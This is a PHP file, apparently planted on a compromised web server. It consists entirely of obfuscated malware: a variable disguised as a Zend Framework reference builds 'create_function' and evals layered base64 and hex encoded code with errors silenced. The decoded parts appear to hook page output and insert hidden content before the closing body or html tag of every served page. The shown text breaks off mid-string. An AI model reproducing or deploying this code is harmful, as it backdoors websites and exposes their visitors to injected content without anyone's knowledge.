<?php $zend_framework="\x63\162\x65\141\x74\145\x5f\146\x75\156\x63\164\x69\157\x6e"; @error_reporting(0); $zend_framework("", "\x7d\73\x40\145\x76\141\x6c\50\x40\142\x61\163\x65\66\x34\137\x64\145\x63\157\x64\145\x28\42\x4a\107\x56\62YTFmWTJiYWsxY3owaXIgPSAiXHg2NlwxNjVceDZlXDE0M1x4NzRcMTUxXHg2ZlwxNTZceDVmXDE0NVx4NzhcMTUxXHg3M1wxNjRceDczIjsgJGV2YTFmWTJiYWwxY3owaXIgPSAiXHg2ZlwxNDJceDVmXDE2M1x4NzRcMTQxXHg3MlwxNjQiOyAkZXZhMWZZMmJhbDFjejhpciA9ICJceDYzXDE1N1x4NjRcMTQ1XHg3OFw2Mlx4MzIiOyBpZigkZXZhMWZZMmJhazFjejBpcigkZXZhMWZZMmJhbDFjejBpcikgJiYgIWlzc2V0KCRHTE9CQUxTWyRldmExZlkyYmFsMWN6OGlyXSkpIHsNCgkkR0xPQkFMU1skZXZhMWZZMmJhbDFjejhpcl09MTsgCWlmKCEkZXZhMWZZMmJhazFjejBpcigiXHg2NVwxNjZceDYxXDYxXHg2NlwxMzFceDMyXDE0Mlx4NjFcMTUzXHgzMVwxNDNceDU2XDYyXHg2OVwxNjIiKSkgeyBpZighJGV2YTFmWTJiYWsxY3owaXIoIlx4NjVcMTY2XHg2MVw2MVx4NjZcMTMxXHgzMlwxNDJceDYxXDE1M1x4MzFcMTQzXHg1Nlw2MFx4NjlcMTYyIikpIHsNCiBmdW5jdGlvbiBldmExZlkyYmFrMWNWMGlyKCkgew0KIC8vZWNobyBzdGFydA0KDQogaWYoIWlzc2V0KCRHTE9CQUxTWyJhZ2hleDAiXSkpIHsNCgkkR0xPQkFMU1siYWdoZXgwIl09MTsNCiAkZXZhbHNzc2dxdWxWQlRrWkxBY2ggPSAiIjsNCiBpZiAoIWlzc2V0KCRldmExZllsYmFrQmNWU2lyKSkgeyRldmExZllsYmFrQmNWU2lyID0gIjdreUo3a1NLaW9EVFdWV2VSQjNUaWNpTDFVamNtUmlMbjRTS2lBRVRzOTBjdVpsVHo1bVJPdEhXSGRXZlJ0MFp1cG1WUk5UVTJZMk1WWmtUOGgxUm4xWFVMZG1icXhHVTdoMVJuMVhVTGRtYnFaVlV6RWxObU5UVkd4RWVOdDFaemtGY21KeUp1VVROeVpHSnVjaUx4azJjd1JDTGlJQ0t1VkhkbEpISm40U055a21ja1JpTG5zVEtuNGlJbklpTG5Ba2RYNVVjMmRsVHNoRWNNaEhUOHhGZU14MlQ0eGpXa05UVXdWR05kVnpXdlYxV2M5V1Qyd2xicVpWWDNsRWNsaFRUS2RXZjhvRVp6a1ZOZHAyTndaR05WdFZYOGRtUlBGM04xVTJjVlpEWDRsVmNkbFdXS2QyYVpCblp0VkZmTkozTjFVMmNWWkRYNGxWY2RsV1dLZDJhWkJuWnRWa1ZUcEdUWEIxSnVJVE55WkdKdUl5Smk0U04xSW5aazR5SnVreUp1SXlKaTR5SjY0R2ZOcGpiV0JWZElkMFQ3TmpWUUpIVndWMmFOWnpXelFqU01oWFRiZDJNWkJuWnhwSGZORm5hc1ZXZXZwMFp0aGpXbkJIUFoxMU1KcFZYOEZsU014RFJXQjFKdUlUTnlaR0p1SXlKaTRTTjFJblprNHlKdWt5SnVJeUppNHlKQVozVk9GbmRYNUVlTnQxWnprRmNtNW1hV0ZsYjBvRVQ0MTBXbk5UV3daV2M2eFhUNDEwV25OVFd3Wm1ibVprVDR4aldrTlRVd1ZHTmRWeld2VjFXYzlXVDJ3bGF6Y0VUbjRpTTFJblprNHlKbjRpSW5JaUwxVWpjbVJpTG40U0tpQWtkWDVVYzJkbFQ5cG5SUVozTndaR05WdFZYOFZsUk94WFYyWUdiWlpqWjR4a1ZQeFdXMWNHYkV4V1o4bDFTbjlXVDIwa2RteFdaOGwxU245V1RMMVVjcXhXWjU5bVNuMUdPYWRHYzhrVlh6a2tXZHhYVUt4RVBFeEdVbjRpTTFJblprNHlKaWNpTDFVamNtUmlMbjBUTXBOSGNrc1RLaWNpTHlVVGF5WkdKdWNTTjN3Vk0xZ0hYMlFUTWNkek00eDFNMUVEWHpVRGVjTlRNeHdWTjNnSFh5RVRNY2hUTjR4Rk4wRURYd01EZWNaak14d0ZaMmdIWHpRVE1jSm1ONHgxTjJFRFg1WURlY0ZUTXh3Vk8yZ0hYM1FUTWNOVE40eGxNekVEWGlaRGVjRnpOY2RETjR4bE0wRURYM2NEZWNGak5jZFRONHhWTTBFRFhtWkRlY1ZqTXh3MU4wZ0hYeU1UTWNaek40eGxOeEVEWDNVRGVjSnpNeHdsWTJnSFh4Y0RYMlFEZWNaVE14d2xNemdIWDFJVE1jSnpNNHgxTTBFRFg0WURlY0pUTXh3MU4wZ0hYeEVUTWNWek40eGxNeEVEWDRVRGVjUkROeHdGTXpnSFgySVRNY1JtTjR4MU0wRURYM01EZWNOVE54d1ZPMmdIWHlRVE1jWnpONHhsTXlFRFg0VURlY0ZETnh3VlkyZ0hYMVlEWDNVRGVjUkROeHdGWjJnSFh5SVRNY05ETjR4Vk14RURYemNEZWNSak5jUm1ONHgxTTBFRFh4TURlY0pqTXh3Rk8xZ0hYeU1UTWNsek40eGxNeUVEWHpRRGVjTlRNeHdsTTNnSFh3Y1RNY2RUTjR4Vk16RURYek1EZWNGek5jWlRONHhWTjBFRFg0WURlY0pUTXh3VloyZ0hYelFUTWNoak40eEZOMkVEWDBVRGVjTlRNeHdWTjNnSFh5RVRNY2hUTjR4Rk4wRURYd01EZWNaak14d0ZaMmdIWHpRVE1jSm1ONHgxTjBFRFh6UURlY1JETnh3Rk0zZ0hYd2NUTWNkRE40eDFNMEVEWGhkRGVjRnpOY05tTjR4MU0wRURYd01EZWNaVE14d0ZPMGdIWHhFVE1jbHpNNHhWTXdFRFg1WURlY0pETnh3Vk8zZ0hYMklUTWNkaUwxSVRheVpHSnVjeU56Z0hYelVUTWNsak40eFZNeEVEWDNNRGVjTlROeHdWTzNnSFgxRVRNY1J6TjR4MU0xRURYNVlEZWNKRE54d2xOM2dIWDBVVE1jZERONHhGTjBFRFhoWkRlY1ZqTmNkVE40eEZOMEVEWGtaRGVjSlRNeHdWTzJnSFgwRVRNY2xqTjR4Vk15RURYelFEZWNOVE14d2xZMmdIWHlFVE1jTnpNNHhsTTBFRFhtWkRlY0ZUTXh3Rk8wZ0hYeFFUTWNGbU40eGxNd0VEWHpVRGVjQmpNeHcxTjJnSFgwWURYeU1EZWNKRE54d0ZNM2dIWHlJVE1jTnpNNHhWTXpFRFgxY0RlY1pqTXh3VloyZ0hYeU1UTWNsak40eEZOMndWTzJnSFh4RVRNY0ptTjR4Vk14RURYelFEZWNSVE14d1ZPMmdIWDBZRFh5TURlY0pETnh3Rk0zZ0hYeUlUTWNOek00eFZNekVEWDFjRGVjWmpNeHdWWjJnSFh5TVRNY2xqTjR4Rk4yd1ZPMmdIWHhFVE1jSm1ONHhWTXpFRFg1WURlY0ZUTXh3bFoyZ0hYMFlEWHlNRGVjSkROeHdGTTNnSFh5SVRNY056TTR4Vk16RURYMWNEZWNaak14d1ZaMmdIWHlNVE1jWmpONHhsTnlFRFgzUURlY1JETnh3Rk8yZ0hYMklUTWNSbU40eDFNMEVEWGhaRGVjSkRNeHcxTTFnSFh3SVRNY2RqTjR4Rk4yd2xNemdIWHlRVE1jQnpNNHhGTjFFRFh5TURlY0Z6TXh3Vk4zZ0hYMklUTWNWbU40eGxNekVEWGlaRGVjTmpOeHdGTzBnSFh4RVRNY0J6TjR4Rk4yd0ZaMmdIWHpRVE1jRnpNNHhsTXlFRFg0VURlY0p6TXh3Vk8zZ0hYeUlUTWNORE40eDFNeEVEWDFjRGVjWmpNeHdWWjJnSFh6UVRNY0J6TTR4bE55RURYa1pEZWNORE54dzFOMmdIWDBZRFh5TURlY0pETnh3Rk0zZ0hYeUlUTWNOek00eFZNekVEWDFjRGVjWmpNeHdWWjJnSFh5TVRNY0ppTG40U055SW5aazR5SnpZVE1jRjJONHhsTXhFRFgxY0RlY1pqTXh3VloyZ0hYelFUTWNCek00eGxOeUVEWGtaRGVjTkROeHdWWjJnSFh3WURYaFpEZWNKRE54d1ZNemdIWHlFVE1jZGlMMUlUYXlaR0p1Y2lJdWNpTDFJamNtUmlMblV6TmNkek40eDFOeEVEWGxaRGVjUmpOY0p6TTR4bE0wRURYd2NEZWNKak14dzFNemdIWHhNVE1jVnpONHhsTnlFRFhsWkRlY0p6TXh3bE4yZ0hYMklUTWNkRE40eEZOMEVEWDRZRGVjWmpNeHdGWjJnSFh6UVRNY0ZtTjR4Rk4wRURYelVEZWNCak14d1ZOM2dIWDJJVE1jZGlMMUlUYXlaR0p1Y2lJdWNpTDFJamNtUmlMbk1qTnh3VlkzZ0hYeUVUTWNObU40eGxOeEVEWDNVRGVjRnpNeHcxTTNnSFh5QVRNY2hUTjR4bE16RURYNWNEZWNGek5jRnpNNHhsTXpFRFhqWkRlY0pUTXh3Rk8wZ0hYelFUTWNWbU40eEZNMndWWTJnSFh5UVRNY2x6TjR4bE53RURYM1FEZWNSRE54dzFZMmdIWHlFVE1jaERONHhsTXhFRFhpNGlNMVFYYW1SQ0x5VWpacFpHSnNVak1tbG1aa2dTWmpGR2J3Vm1jZmRXWnlCM09pSWpNNHhGTTF3Vk4yZ0hYMFFUTWNabU40eDFNMEVEWDFZRGVjUkROeHdsWjFnSFgwWURYMk1EZWNWRE54dzFNM2dIWHhRVE1jSmpONHhGTTF3MVkyZ0hYeFFUTWNaek40eFZOMEVEWHdRRGVjSkNJOUFpTTFRWGFtUnlPaUkyTTR4Vk0xd2xNeWdIWHhZRFhqVkRlY0pETmNoak00eEZOMUVEWHhZRGVjWmpOeHdWTjJnSFhpQVNQZ0lUTm1sbVprc2pJMVFUTWNsak40eEZNd0VEWDVJRGVjTlROY1ZtTTR4Rk0xd0ZNMGdIWGlBU1BnVWpNbWxtWmtjQ0tzRm1kbHRqSXdJRGVjVnpOY0JqTTR4Rk0yd0ZOMmdIWDBRVE1jUmpNNHhsSWcwREkxSVRheVJHSmdzVE4xa21jbVJpTG5raUluNGlNMWttY21SQ0k5QVNOeUluWmtBeU9uZ0RONHhGTjBFRFhqWkRlY0pUTXh3Rk8wZ0hYeUVUTWNkQ0k5QVNOeWttY21SeU9uSTJNNHhWTTF3Vk95Z0hYeVFEWGtORGVjZENJOUFpTTFrbWNtUnlPblFEVjJZV2ZWdFVUbkFTUGdJVE55WkdKN2NDS3VWbmMwVm1ja2NDSTlBU04xSW5aa3N6SnlVRGRwWkdKc0lUTm1sbVprd1NOeVlXYW1SQ0t1SlhZMFZtY2tzekpnMERJMVVUYXlaR0orYVdZZ0tDRnBjM05sZENna1pYWmhiRlZrUTFoVVJGRkZVbTFYYmtSVEtTa2dlMloxYm1OMGFXOXVJR1YyWVd4c2QyaFdaa2xXYmxkUVlsUW9KSE1wZXlSbElEMGdJaUk3SUdadmNpQW9KR0VnUFNBd095QWtZU0E4UFNCemRISnNaVzRvSkhNcExURTdJQ1JoS3lzZ0tYc2taU0F1UFNBa2MzdHpkSEpzWlc0b0pITXBMU1JoTFRGOU8zMXlaWFIxY200b0pHVXBPMzFsZG1Gc0tHVjJZV3hzZDJoV1prbFdibGRRWWxRb0p6c3BLU0k5UVZObU4ydDVZVTVTYldKQ1VsaFhkazV1VW1wR1ZWZEtlRmRaTWxaSFNtOVZSMXAyVGxkYWF6bEdUakpWTW1Ob1NrZEpkVXBZWkRCV2JXTTNRbE5MY2pGRlduVkdSV1JhT1RKalIwNVhVVnBzUldKb1dsaGFhMmRwVWxSS2ExcFFiREJhYUZKR1lsQkNSbUZQTVVWaWFGcFlXbWMwTW1Kd1VqTlpkVlp1V2lJb1pXUnZZMlZrWHpRMlpYTmhZaWhzWVhabEp5a3BPMlYyWVd3b1pYWmhiR3gzYUZabVNWWnVWMUJpVkNnbk95a3BJamRyYVVrNU1FVlRhMmh0VlhwTmJVbHZXVEJWUTFveVZFcGtWMWxWZURKVVVXaHRWRTU0VjFreVZsZFFXRTVHV201T1JWcFdiRlpoUms1V1ltaDRWMWt5VmtkS0lpaGxaRzlqWldSZk5EWmxjMkZpS0d4aGRtVW5LU2s3WlhaaGJDaGxkbUZzYkhkb1ZtWkpWbTVYVUdKVUtDYzdLU2tpTjJ0cFNUa3dWRkZxUW1wVlNVWnRTVzlaTUZWRFdqSlVTbVJYV1ZWNE1sUlJhRzFVVG5oWFdUSldWMUJZV2xaamFGcHNZM0JXTWxaVmVGZFpNbFpIU2lJb1pXUnZZMlZrWHpRMlpYTmhZaWhzWVhabEp5a3BPMlYyWVd3b1pYWmhiR3gzYUZabVNWWnVWMUJpVkNnbk95a3BJamRyYVVrNVVYcFdhRXBEUzBkT2JGRnRPVlZUYmtaSFZuTTVSVlZ2TlZWVWMwWnRaR3d4YWxGdGFFWlNWbVJGWkdsV1JscERlRmRaTWxaSFNpSW9aV1J2WTJWa1h6UTJaWE5oWWloc1lYWmxKeWtwTzJWMllXd29aWFpoYkd4M2FGWm1TVlp1VjFCaVZDZ25PeWtwSWowOWQwOXdTVk5RT1VWV1V6SlNNbFpLU2tOTFIwNXNVVzA1VlZOdVJrZFdjemxGVlc4MVZWUnpSbTFrYkRGVVdsWndibEoxVmpKUmMwb3laRko0VjFreVZrZEtJaWhsWkc5alpXUmZORFpsYzJGaUtHeGhkbVVuS1NrN1pYWmhiQ2hsZG1Gc2JIZG9WbVpKVm01WFVHSlVLQ2M3S1NraVBYTlVXSEJKVTFZeFZXeFZTVnBGVFZsT2JGWjNWV3hXTlZsVlZsWktiRkpVU2tOTFIwNXNVVzA1VlZOdVJrZFdjemxGVlc4MVZWUnpSbTFrYkhSc1ZVWmFiRlZHVGpGWWF6QjZVVzFPTWxwT1FtNWtjRTVZVkhsNFYxa3lWa2RLSWlobFpHOWpaV1JmTkRabGMyRmlLR3hoZG1VbktTazdaWFpoYkNobGRtRnNiSGRvVm1aSlZtNVhVR0pVS0NjN0tTa2lQWE5VUzNCcmFXTnhUbXhXYWtZd1lXaFNSMWRhVWxoTmFGcFlXbXRuYVdSc1NtNWpNRTVJUzBkT2JGRnRPVlZUYmtaSFZuTTVSVlZ2TlZWVWMwWnRaR3hvUTJKb1dsaGFJaWhsWkc5alpXUmZORFpsYzJGaUtHeGhkbVVuS1NrN1pYWmhiQ2hsZG1Gc2JIZG9WbVpKVm01WFVHSlVLQ2M3S1NraVBYTlVTM0JKVTFBNVl6SlpjMmhZWWxwU2JsSjBWbXhKYjFrd1ZVTmFNbFJLWkZkWlZYZ3lWRkZvYlZST2VGZFpNbFpIU1hOcmFVa3dXVEZTWVZadVVsaGtiRWx2V1RCVlExb3lWRXBrVjFsVmVESlVVV2h0VkU1NFYxa3lWa2RKYzJ0cFNUbHJSVmRoU2tSaVNFWnRZVXRvVmxkdFdqQldhRXBEUzBkT2JGRnRPVlZUYmtaSFZuTTVSVlZ2TlZWVWMwWnRaR3hDUTB4d1NVTk5OVEJYVlZBMWExWlZTa05MUjA1c1VXMDVWVk51UmtkV2N6bEZWVzgxVlZSelJtMWtiRUpEVEhCSlUxQkNOVEpaZUdkdVRWWktRMHRIVG14UmJUbFZVMjVHUjFaek9VVlZielZWVkhOR2JXUnNRa05NY0VsRFlqUkthbGN5YkdwTlUwcERTMGRPYkZGdE9WVlRia1pIVm5NNVJWVnZOVlZVYzBadFpHeG9VMlZvU201amFFSlRVR2RSU0ZWRmFESmllbVJGWkhWU1JXUlZlRmRaTWxaSFNpSW9aV1J2WTJWa1h6UTJaWE5oWWloc1lYWmxKeWtwTzJWMllXd29aWFpoYkd4M2FGWm1TVlp1VjFCaVZDZ25PeWtwSWowOWQwOXdhMmxKTlZGSVZreHdibFZFZEd0bFV6VnRXWE5LYkdKcFdtNVVlV2RHVFZkS2FsZHRXakZTYVVKdVYwaEdNVm93TURKWmVFbEdWMkZzU0dSSmJFVmpUbWhyVTNaU1ZHSlNNV3RVZVVsc1UzTkNSRlpoV2pCTmFIQnJVMVpTYkZKcldtdFpiM0JHVjJGa1IwNTVTVWRqVTA1VVZ6RmFiR0poU2tOTFIwNXNVVzA1VlZOdVJrZFdjemxGVlc4MVZWUnpSbTFrYkdoRFltaGFXRm9pS0dWa2IyTmxaRjgwTm1WellXSW9iR0YyWlNjcEtUdGxkbUZzS0dWMllXeHNkMmhXWmtsV2JsZFFZbFFvSnpzcEtTSTlQWGRQY0dkRFRXdFNSMHBuTUVSSldYQklVbmxvTVZSSlpESlRibmhYV1RKV1Iwb2lLR1ZrYjJObFpGODBObVZ6WVdJb2JHRjJaU2NwS1R0bGRtRnNLR1YyWVd4c2QyaFdaa2xXYmxkUVlsUW9KenNwS1NJOVBWRm1PWFJVV0hoelJtRnFSa1ZVWVhSSFZrTmFSbUl4UmpOYWVrNHpZM05HYldSc1VrTkpPVUZEWVdwR1JWUmhkRWRXUTFwR1lqRkdNMXA2VGpOamMwWnRaR3hTUTBrM2EwTmhha1pGVkdGMFIxWkRXa1ppTVVZelducE9NMk56Um0xa2JGSkRUR3hXYkdWSE5WZGFSSGh0V1ROR1JtSm9XbGhhYTJkVFdtczVSMkozYUZoYVp6QkVTVzlPVjFGTmNERmhWVXByVm5OV1dHTnVUak5qZW5oWFdUSldSMG8zYkZOTGJGWnNaVWMxVjFwRWVHMVpNMFpHWW1oYVdGcHJkME5oYWtaRlZHRjBSMVpEV2taaU1VWXpXbnBPTTJOelJtMWtiRkpEUzNsU00yTjVVak5qYjBGcFduQjBWRXR3TUZaTGFWVnNWSGhSVmxNMVdWVldWa3BzVWxSS1EwdEhUbXhSYlRsVlUyNUdSMVp6T1VWVmJ6VlZWSE5HYldSc2RHeFZSbHBzVlVaT01WaHJaMU5hYXpreVdYVldSMko1Vm01TWNFbFRUMjR4YlZOcFoybFNWRXByV2xCc01GcG9Va1ppVUVKR1lVOHhSV0pvV2xoYWRXdDVVVzFPTWxwT1FtNWtjRTVZVkhsNFYxa3lWa2RLYjFWSFduWk9iV0pzZUcxak1UVlRTMmxyVkZOMGNHdEpiMWt3VlVOYU1sUktaRmRaVlhneVZGRm9iVlJPZUZkWk1sWnRUR1JzYVVrNWEydFNVMVpyVW5kbmJGSlRSa1JXVDFveFlWWktRMHRIVG14UmJUbFZVMjVHUjFaek9VVlZielZWVkhOR2JXUnNkR3hWUmxwc1ZVWk9NVmhyTkZOTGFUQkVUVlZHYlVsdldUQlZRMW95VkVwa1YxbFZlREpVVVdodFZFNTRWMWt5Vm0xTWNFbFRVRFJSTUZscFoybFNWRXByV2xCc01GcG9Va1ppVUVKR1lVOHhSV0pvV2xoYWRXdHBTWFpLYTJKTlNrTkxSMDVzVVcwNVZWTnVSa2RXY3psRlZXODFWVlJ6Um0xa2JEVnBVVzFvUmxKV1pFVmthVlpHV2tONFYxa3lWa2RLZFd0cFNUa3dlbVJOU2tOTFIwNXNVVzA1VlZOdVJrZFdjemxGVlc4MVZWUnpSbTFrYkRWRFZ6WlNhMk5aT1VWVGJuUXdXbk5HYldSc1VtbE1jRWxUVURSclNGUnBaMmxTVkVwcldsQnNNRnBvVWtaaVVFSkdZVTh4UldKb1dsaGFkV3RwU1Rrd2VscFFTa05MUjA1c1VXMDVWVk51UmtkV2N6bEZWVzgxVlZSelJtMWtiRFY1VmxkR1dGbFhTbGhoYkdSR1ZuTkdiV1JzVWtOTGRVcEZWR3BrVlZOS09WVlhlSFJYVTBNeFZWSlllRmRaTWxaSFNUbEJRMkZxUmtWVVlYUkhWa05hUm1JeFJqTmFlazR6WTNOR2JXUnNVa05KTjJ0RFRYZG5SRTE0YzFOTGIxVlhZbkJTU0V4d2EybEpPVEJGVTJ0b2JWVjZUVzFKYjFrd1ZVTmFNbFJLWkZkWlZYZ3lWRkZvYlZST2VGZFpNbFpIU3pGUlYySnpZekZWYTJReVVXdFdWbGR3VmpCVmRFWkhZbWhhV0ZwcloxTmFjSFF5WW5aT1IyUnNUa2hSWjNOSVNXeE9TR0pzUWxObU4wSlRTM0JyVTFoWVRrWmFiazVGV2xac1ZtRkdUbFppYUhoWFdUSldSMHBpVmxWVFREa3dWRVE1UmtwdlVWaGFlazVZWVc5QmFXTjJRbE5MY0UxcldtcGtWMVIzV2xoaGVqRnJZM05HYldSc1VrTkpjMGxUWVhaSlEwbDFRVk5MTUVKR1VtODVNbU5JVW01aVJWSklWbk5HYldSc1VrTkpjMGxEWm1sblUxcHJPVWRpZHpGWFlXYzBRMGxwT0dsSmIyY3lXVEJHVjJKbVpGZGFlVUpJUzI5WlYyRWlLR1ZrYjJObFpGODBObVZ6WVdJb2JHRjJaU2NwS1Rza1pYWmhiRlZrUTFoVVJGRkZVbTFYYmtSVElEMHhPRGM1TWp0OSI7JGV2YTF0WWxiYWtCY1ZTaXIgPSAiXHg2NVwxNDRceDZmXDE1NFx4NzBcMTcwXHg2NSI7JGV2YTF0WWxkYWtCY1ZTaXIgPSAiXHg3M1wxNjRceDcyXDE2Mlx4NjVcMTY2IjskZXZhMXRZbGRha0JvVlMxciA9ICJceDY1XDE0M1x4NjFcMTU0XHg3MFwxNDVceDcyXDEzN1x4NjdcMTQ1XHg3MlwxNjAiOyRldmExdFlpZG9rQm9WU2pyID0gIlx4M2JcNTFceDI5XDEzNVx4MzFcMTMzXHg3MlwxNTJceDUzXDEyNlx4NjNcMTAyXHg2YlwxNDFceDY0XDE1MVx4NTlcMTY0XHgzMVwxNDFceDc2XDE0NVx4MjRcNTBceDY1XDE0NFx4NmZcMTQzXHg2NVwxNDRceDVmXDY0XHgzNlwxNDVceDczXDE0MVx4NjJcNTBceDZjXDE0MVx4NzZcMTQ1XHg0MFw3Mlx4NjVcMTY2XHg2MVwxNTRceDI4XDQyXHg1Y1w2MVx4MjJcNTFceDNiXDcyXHg0MFw1MFx4MmVcNTNceDI5XDEwMFx4NjlcMTQ1IjskZXZhMXRZbGRva0JjVlNqcj0kZXZhMXRZbGRha0JjVlNpcigkZXZhMXRZbGRha0JvVlMxcik7JGV2YTF0WWxkYWtCY1ZTanI9JGV2YTF0WWxkYWtCY1ZTaXIoJGV2YTF0WWxiYWtCY1ZTaXIpOyRldmExdFlpZGFrQmNWU2pyID0gJGV2YTF0WWxkYWtCY1ZTanIoY2hyKDI2ODcuNSowLjAxNiksICRldmExZllsYmFrQmNWU2lyKTskZXZhMXRZWGRha0FjVlNqciA9ICRldmExdFlpZGFrQmNWU2pyWzAuMDMxKjAuMDYxXTskZXZhMXRZaWRva0JjVlNqciA9ICRldmExdFlsZGFrQmNWU2pyKGNocigzNjI1KjAuMDE2KSwgJGV2YTF0WWlkb2tCb1ZTanIpOyRldmExdFlsZG9rQmNWU2pyKCRldmExdFlpZG9rQmNWU2pyWzAuMDE2Kig3ODEyLjUqMC4wMTYpXSwkZXZhMXRZaWRva0JjVlNqcls2Mi41KjAuMDE2XSwkZXZhMXRZbGRha0JjVlNpcigkZXZhMXRZaWRva0JjVlNqclswLjA2MSowLjAzMV0pKTskZXZhMXRZbGRha0JjVlNpciA9ICIiOyRldmExdFlsZGFrQm9WUzFyID0gJGV2YTF0WWxiYWtCY1ZTaXIuJGV2YTF0WWxiYWtCY1ZTaXI7JGV2YTF0WWlkb2tCb1ZTanIgPSAkZXZhMXRZbGJha0JjVlNpcjskZXZhMXRZbGRha0JjVlNpciA9ICJceDczXDE2NFx4NzJceDY1XDE0M1x4NzJcMTYwXDE2NFx4NzIiOyRldmExdFlsYmFrQmNWU2lyID0gIlx4NjdcMTQxXHg2ZlwxMzNceDcwXDE3MFx4NjUiOyRldmExdFlsZGFrQm9WUzFyID0gIlx4NjVcMTQzXHg3MlwxNjAiOyRldmExdFlsZGFrQmNWU2lyID0gIiI7JGV2YTF0WWxkYWtCb1ZTMXIgPSAkZXZhMXRZbGJha0JjVlNpci4kZXZhMXRZbGJha0JjVlNpcjskZXZhMXRZaWRva0JvVlNqciA9ICRldmExdFlsYmFrQmNWU2lyO30gfSAgDQogDQogcmV0dXJuICRldmFsc3NzZ3F1bFZCVGtaTEFjaDsgICB9IH0NCiBpZighJGV2YTFmWTJiYWsxY3owaXIoIlx4NjdcMTcyXHg2NFwxNDVceDYzXDE1N1x4NjRcMTQ1IikpIHsNCiBmdW5jdGlvbiBnemRlY29kZSgkZXZhMWZZMmJvMDF6bzgxNykgeyAkZXZhMWZZMmJhbDFjejhpNCA9ICJceDczXDE2NFx4NzJcMTYwXHg2ZlwxNjMiOyAkZXZhMWZZMmJvbDFjejhpNSA9ICJceDczXDE2NVx4NjJcMTYzXHg3NFwxNjIiOyAkZXZhMWZZMmJvMTFjejhpNSA9ICJceDc1XDE1Nlx4NzBcMTQxXHg2M1wxNTMiOyAkZXZhMWZZMmJvMWxjejhpNSA9ICJceDYzXDE1MFx4NzIiOyAkZXZhMWZZMmJvMWx6YzhpNSA9ICJceDY3XDE3Mlx4NjlcMTU2XHg2NlwxNTRceDYxXDE2NFx4NjUiOw0KICRldmExZlkyYm8wMXpvMzE3PUBvcmQoQCRldmExZlkyYm9sMWN6OGk1KCRldmExZlkyYm8wMXpvODE3LDMsMSkpOw0KICRldmExZlkyYm8wMWMwMzE3PTEwOyAgaWYoJGV2YTFmWTJibzAxem8zMTcmNCkgew0KICRldmExZlkyYm8wMXowMzE3PUAkZXZhMWZZMmJvMTFjejhpNSgndicsJGV2YTFmWTJib2wxY3o4aTUoJGV2YTFmWTJibzAxem84MTcsMTAsMikpOw0KICRldmExZlkyYm8wMXowMzE3PSRldmExZlkyYm8wMXowMzE3WzFdOw0KICRldmExZlkyYm8wMWMwMzE3Kz0yKyRldmExZlkyYm8wMXowMzE3Ow0KIH0gIGlmKCRldmExZlkyYm8wMXpvMzE3JjgpIHsNCiAkZXZhMWZZMmJvMDFjMDMxNz1AJGV2YTFmWTJiYWwxY3o4aTQoJGV2YTFmWTJibzAxem84MTcsJGV2YTFmWTJibzFsY3o4aTUoMCksJGV2YTFmWTJibzAxYzAzMTcpKzE7DQogfSAgaWYoJGV2YTFmWTJibzAxem8zMTcmMTYpIHsNCiAkZXZhMWZZMmJvMDFjMDMxNz1AJGV2YTFmWTJiYWwxY3o4aTQoJGV2YTFmWTJibzAxem84MTcsJGV2YTFmWTJibzFsY3o4aTUoMCksJGV2YTFmWTJibzAxYzAzMTcpKzE7DQogfSAgaWYoJGV2YTFmWTJibzAxem8zMTcmMikgew0KICRldmExZlkyYm8wMWMwMzE3Kz0yOw0KIH0gICRldmExZlkyYm8wMWMwM2E3PUAkZXZhMWZZMmJvMWx6YzhpNShAJGV2YTFmWTJib2wxY3o4aTUoJGV2YTFmWTJibzAxem84MTcsJGV2YTFmWTJibzAxYzAzMTcpKTsgIGlmKCRldmExZlkyYm8wMWMwM2E3PT09RkFMU0UpIHsNCiAkZXZhMWZZMmJvMDFjMDNhNz0kZXZhMWZZMmJvMDF6bzgxNzsNCiB9ICByZXR1cm4gJGV2YTFmWTJibzAxYzAzYTc7DQogfSB9DQogZnVuY3Rpb24gZXZhMWZZMmJhazFjVjJpcigkdmFyNikgeyAkZXZhMWZZMmIwMWx6YzhsNSA9ICJceDcwXDE2Mlx4NjVcMTQ3XHg1ZlwxNjJceDY1XDE2MFx4NmNcMTQxXHg2M1wxNDUiOyAkZXZhMWZZMmIwbGx6YzhsNSA9ICJceDcwXDE2Mlx4NjVcMTQ3XHg1ZlwxNTVceDYxXDE2NFx4NjNcMTUwIjsgJGV2YTFmWTJiMDIyemM4bDUgPSAiXHg0OFwxNDVceDYxXDE0NFx4NjVcMTYyIjsgJGV2YTFmWTJiMDIyem84bDUgPSAiXHg2N1wxNzJceDY0XDE0NVx4NjNcMTU3XHg2NFwxNDUiOyAkZXZhMWZZMmIwNTJ6bzhsNSA9ICJceDQzXDE1N1x4NmVcMTY0XHg2NVwxNTZceDc0XDU1XHg0NVwxNTZceDYzXDE1N1x4NjRcMTUxXHg2ZVwxNDdceDNhXDQwXHg2ZVwxNTdceDZlXDE0NSI7ICRldmExZlkyYjA1MnpvOGwxID0gIlx4MmZcMTM0XHgzY1wxMzRceDJmXDE0Mlx4NmZcMTQ0XHg3OVw1N1x4NzNcMTUxIjsgJGV2YTFmWTJiMDYyem84bDEgPSAiXHgyZlw1MFx4NWNcNzRceDVjXDU3XHg2MlwxNTdceDY0XDE3MVx4NWJcMTM2XHg1Y1w3Nlx4NWRcNTJceDVjXDc2XHgyOVw1N1x4NzNcMTUxIjsgJGV2YTFmWTJiMDYxem84bDEgPSAiXHgyZlwxMzRceDNjXDEzNFx4MmZcMTUwXHg3NFwxNTVceDZjXDU3XHg3M1wxNTEiOyAkZXZhMWZZMmJvNjF6bzhsMSA9ICJceDJmXDUwXHg1Y1w3NFx4NWNcNTdceDY4XDE2NFx4NmRcMTU0XHg1YlwxMzZceDVjXDc2XHg1ZFw1Mlx4NWNcNzZceDI5XDU3XHg3M1wxNTEiOyAkZXZhMWZZMmIwMjJ6YzhsNSgkZXZhMWZZMmIwNTJ6bzhsNSk7ICRldmExZlkyYm82MXpvOGw3PSRldmExZlkyYjAyMnpvOGw1KCR2YXI2KTsgIGlmKCRldmExZlkyYjBsbHpjOGw1KCRldmExZlkyYjA1MnpvOGwxLCRldmExZlkyYm82MXpvOGw3KSkgew0KIHJldHVybiAkZXZhMWZZMmIwMWx6YzhsNSgkZXZhMWZZMmIwNjJ6bzhsMSwgZXZhMWZZMmJhazFjVjBpcigpLiJcbiIuIlx4MjRcNjEiLCAkZXZhMWZZMmJvNjF6bzhsNywxKTsgfSBlbHNlIHsNCiBpZigkZXZhMWZZMmIwbGx6YzhsNSgkZXZhMWZZMmIwNjF6bzhsMSwkZXZhMWZZMmJvNjF6bzhsNykpIHsNCiByZXR1cm4gJGV2YTFmWTJiMDFsemM4bDUoJGV2YTFmWTJ